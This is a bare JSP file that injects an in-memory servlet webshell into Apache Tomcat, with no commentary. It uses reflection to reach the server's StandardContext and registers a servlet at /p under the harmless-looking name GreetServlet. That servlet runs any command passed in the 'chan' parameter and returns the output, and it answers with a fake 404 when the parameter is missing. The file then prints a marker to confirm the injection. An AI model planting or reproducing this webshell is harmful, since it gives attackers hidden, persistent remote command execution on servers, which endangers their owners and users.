<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import = "org.apache.catalina.core.ApplicationContext"%>
<%@ page import = "org.apache.catalina.core.StandardContext"%>
<%@ page import = "javax.servlet.*"%>
<%@ page import = "java.io.IOException"%>
<%@ page import = "java.lang.reflect.Field"%>


<%
class GreetServlet implements Servlet{
    @Override
    public void init(ServletConfig config) throws ServletException {}
	
    @Override
    public String getServletInfo() {return null;}
	
    @Override
    public void destroy() {}    public ServletConfig getServletConfig() {return null;}
    
    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        if (request.getParameter("chan") != null){
			Process process = Runtime.getRuntime().exec(request.getParameter("chan"));
			java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
					new java.io.InputStreamReader(process.getInputStream()));
			StringBuilder stringBuilder = new StringBuilder();
			String line;
			while ((line = bufferedReader.readLine()) != null) {
				stringBuilder.append(line + '\n');
			}
			response.getOutputStream().write(stringBuilder.toString().getBytes());
			response.getOutputStream().flush();
			response.getOutputStream().close();
			return;
        }
        else{
            response.sendError(HttpServletResponse.SC_NOT_FOUND);
        }
    }
}
%>


<%
	ServletContext servletContext =  request.getSession().getServletContext();

	Field appctx = servletContext.getClass().getDeclaredField("context");
	appctx.setAccessible(true);
	ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); 
	
	Field stdctx = applicationContext.getClass().getDeclaredField("context");
	stdctx.setAccessible(true);
	StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 
	
	GreetServlet greetServlet = new GreetServlet();
		
	org.apache.catalina.Wrapper greetWrapper = standardContext.createWrapper();
	greetWrapper.setName("p");
	greetWrapper.setLoadOnStartup(1);
	greetWrapper.setServlet(greetServlet);
	greetWrapper.setServletClass(greetServlet.getClass().getName());
	
	standardContext.addChild(greetWrapper);
	standardContext.addServletMapping("/p", "p");
	out.println(">@<");
%>